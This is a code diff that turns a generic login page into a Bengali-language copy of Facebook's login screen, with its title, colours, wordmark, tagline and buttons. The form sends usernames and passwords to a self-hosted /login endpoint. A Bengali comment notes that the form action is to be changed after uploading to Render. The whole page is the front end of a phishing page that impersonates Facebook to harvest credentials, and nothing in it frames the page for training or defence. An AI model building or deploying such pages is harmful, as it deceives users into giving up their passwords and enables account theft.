@@ -1,19 +1,19 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="bn">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Portal - Login</title>
+    <title>Facebook – লগ ইন বা সাইন আপ করুন</title>
     <style>
         * {
             box-sizing: border-box;
             margin: 0;
             padding: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            font-family: SFProDisplay-Regular, Helvetica, Arial, sans-serif;
         }
 
         body {
-            background-color: #f4f6f9;
+            background-color: #f0f2f5;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -21,117 +21,181 @@
             padding: 20px;
         }
 
-        .login-card {
-            background-color: #ffffff;
-            padding: 40px 30px;
-            border-radius: 12px;
-            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.05);
+        .container {
+            display: flex;
+            max-width: 980px;
             width: 100%;
-            max-width: 420px;
-            text-align: center;
+            justify-content: space-between;
+            align-items: center;
+            gap: 40px;
         }
 
-        .brand-header h2 {
-            font-size: 26px;
-            font-weight: 700;
-            color: #1a73e8;
-            margin-bottom: 8px;
-        }
-
-        .brand-header p {
-            font-size: 14px;
-            color: #5f6368;
-            margin-bottom: 30px;
-        }
-
-        .form-group {
-            margin-bottom: 20px;
+        .left-content {
+            max-width: 500px;
             text-align: left;
         }
 
-        .form-group label {
-            display: block;
-            font-size: 13px;
-            font-weight: 600;
-            color: #3c4043;
-            margin-bottom: 6px;
+        .left-content h1 {
+            color: #1877f2;
+            font-size: 60px;
+            font-weight: 800;
+            letter-spacing: -1px;
+            margin-bottom: 16px;
         }
 
-        .form-group input {
+        .left-content p {
+            font-size: 24px;
+            line-height: 28px;
+            color: #1c1e21;
+            font-weight: normal;
+        }
+
+        .right-content {
             width: 100%;
-            padding: 14px;
-            border: 1px solid #dadce0;
-            border-radius: 8px;
-            font-size: 15px;
-            outline: none;
-            transition: all 0.2s ease-in-out;
-            background-color: #fafafa;
+            max-width: 396px;
         }
 
-        .form-group input:focus {
-            border-color: #1a73e8;
-            background-color: #ffffff;
-            box-shadow: 0 0 0 3px rgba(26, 115, 232, 0.1);
-        }
-
-        .btn-submit {
-            width: 100%;
-            padding: 14px;
-            background-color: #1a73e8;
-            color: #ffffff;
+        .login-box {
+            background: #ffffff;
             border: none;
             border-radius: 8px;
-            font-size: 16px;
-            font-weight: 600;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            text-align: center;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            outline: none;
+            margin-bottom: 12px;
+            transition: border-color 0.2s;
+        }
+
+        .input-field:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+
+        .btn-login {
+            width: 100%;
+            background-color: #1877f2;
+            border: none;
+            border-radius: 6px;
+            color: #ffffff;
+            font-size: 20px;
+            font-weight: 700;
+            padding: 12px;
             cursor: pointer;
-            margin-top: 10px;
-            transition: background-color 0.2s;
+            margin-bottom: 16px;
         }
 
-        .btn-submit:hover {
-            background-color: #1557b0;
+        .btn-login:hover {
+            background-color: #166fe5;
         }
 
-        .form-footer {
-            margin-top: 25px;
+        .forgot-link {
+            color: #1877f2;
             font-size: 14px;
-        }
-
-        .form-footer a {
-            color: #1a73e8;
             text-decoration: none;
+            display: inline-block;
+            margin-bottom: 20px;
         }
 
-        .form-footer a:hover {
+        .forgot-link:hover {
             text-decoration: underline;
+        }
+
+        .divider {
+            align-items: center;
+            border-bottom: 1px solid #dadde1;
+            display: flex;
+            margin: 20px 0;
+        }
+
+        .btn-create {
+            background-color: #42b72a;
+            border: none;
+            border-radius: 6px;
+            color: #ffffff;
+            font-size: 17px;
+            font-weight: 700;
+            padding: 0 16px;
+            line-height: 48px;
+            cursor: pointer;
+            display: inline-block;
+        }
+
+        .btn-create:hover {
+            background-color: #36a420;
+        }
+
+        .footer-text {
+            margin-top: 28px;
+            font-size: 14px;
+            color: #1c1e21;
+        }
+
+        .footer-text a {
+            text-decoration: none;
+            font-weight: 600;
+            color: #1c1e21;
+        }
+
+        .footer-text a:hover {
+            text-decoration: underline;
+        }
+
+        /* মোবাইল স্ক্রিনের জন্য রেসপন্সিভনেস */
+        @media (max-width: 900px) {
+            .container {
+                flex-direction: column;
+                text-align: center;
+                gap: 20px;
+            }
+            .left-content {
+                text-align: center;
+                max-width: 100%;
+            }
+            .left-content h1 {
+                font-size: 48px;
+                margin-bottom: 8px;
+            }
+            .left-content p {
+                font-size: 18px;
+                line-height: 22px;
+                padding: 0 20px;
+            }
         }
     </style>
 </head>
 <body>
 
-    <div class="login-card">
-        <div class="brand-header">
-            <h2>CloudAuth</h2>
-            <p>Sign in to continue to your dashboard</p>
+    <div class="container">
+        <!-- বাম পাশের ব্র্যান্ডিং সেকশন -->
+        <div class="left-content">
+            <h1>facebook</h1>
+            <p>ফেসবুক আপনাকে আপনার জীবনের চারপাশের মানুষের সাথে যোগাযোগ রাখতে এবং শেয়ার করতে সাহায্য করে।</p>
         </div>
 
-        <!-- Render-এ আপলোড করার পর ব্যাকএন্ড ফাইলের নাম অনুযায়ী action পরিবর্তন করতে হবে -->
-        <form action="/login" method="POST">
-            <div class="form-group">
-                <label for="username">Email or Username</label>
-                <input type="text" id="username" name="username" placeholder="name@example.com" required autocomplete="off">
+        <!-- ডান পাশের লগইন ফর্ম -->
+        <div class="right-content">
+            <div class="login-box">
+                <form action="/login" method="POST">
+                    <input type="text" class="input-field" name="username" placeholder="ইমেল ঠিকানা বা ফোন নম্বর" required autocomplete="off">
+                    <input type="password" class="input-field" name="password" placeholder="পাসওয়ার্ড" required>
+                    <button type="submit" class="btn-login">লগ ইন করুন</button>
+                </form>
+                <a href="#" class="forgot-link">পাসওয়ার্ড ভুলে গেছেন?</a>
+                <div class="divider"></div>
+                <button type="button" class="btn-create">নতুন অ্যাকাউন্ট তৈরি করুন</button>
             </div>
-
-            <div class="form-group">
-                <label for="password">Password</label>
-                <input type="password" id="password" name="password" placeholder="Enter your password" required>
+            <div class="footer-text">
+                প্রসিদ্ধ ব্যক্তি, ব্যান্ড বা ব্যবসার জন্য একটি <a href="#">পৃষ্ঠা তৈরি করুন</a>।
             </div>
-
-            <button type="submit" class="btn-submit">Sign In</button>
-        </form>
-
-        <div class="form-footer">
-            <a href="#">Forgot password?</a>
         </div>
     </div>
 
